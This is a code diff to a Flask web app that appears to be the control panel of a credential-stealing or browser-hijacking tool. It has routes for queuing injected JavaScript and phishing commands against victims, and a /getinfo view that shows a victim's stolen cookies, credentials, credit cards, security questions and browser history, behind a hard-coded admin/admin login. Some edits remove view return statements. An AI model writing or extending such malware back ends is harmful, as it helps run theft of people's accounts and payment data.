@@ -33,8 +33,9 @@ def load_user(userid):
 def login():
     form = LoginForm()
     error = None
+
     if form.validate_on_submit():
-        if request.form['username'] == 'admin' and request.form['password'] == 'admin':
+        if request.form['username'] =='admin' and request.form['password'] == 'admin':
             user = User("admin")
             login_user(user)
             return redirect(url_for('attack_mode'))
@@ -76,7 +77,6 @@ def sendjs():
     z = request.form['pattern']
     c = a + '\n' + b + '\n' + z
     database.add_js_cmd(b, z, a)
-    return 'OK';
 
 
 @app_flask.route('/phish', methods=['POST'])
@@ -87,14 +87,13 @@ def phish():
     y = request.form['pattern']
     f = d + '\n' + e + '\n' + y
     database.add_phish_cmd(d, y, e)
-    return 'OK';
-
 
 
 @app_flask.route('/getinfo', methods=['POST'])
 @login_required
 def getinfo():
     userid = int(request.form['id'])
+    fullbh = request.form['fullbh']
     conn = database.getConn()
     with conn.cursor() as cur:
         cur.execute('SELECT * FROM Client WHERE ID = (%s)', (userid,))
@@ -109,13 +108,18 @@ def getinfo():
         questions = cur.fetchall()
         conn.close()
 
-    head = ""
+    # head = "url1\nurl2\nurl3\nurl4\nurl5\nurl6\nurl7\nurl8\nurl9\nurl10"
+    # sites = head.split('\n')
+    sites_in_html = []
+    # for x in sites:
+    #     sites_in_html.append(x)
+
     # browser_history = database.get_history(userid)
     # with open(browser_history) as bh:
     #     head = [next(bh) for x in range(10)]
 
     return render_template('result.html', data=record, cookies=cookies, credentials=credentials,
-                           creditcards=creditcards, questions=questions, history = head)
+                           creditcards=creditcards, questions=questions, history = sites_in_html, fullbh = fullbh)
 
 #
 # def update_payload(id, text):
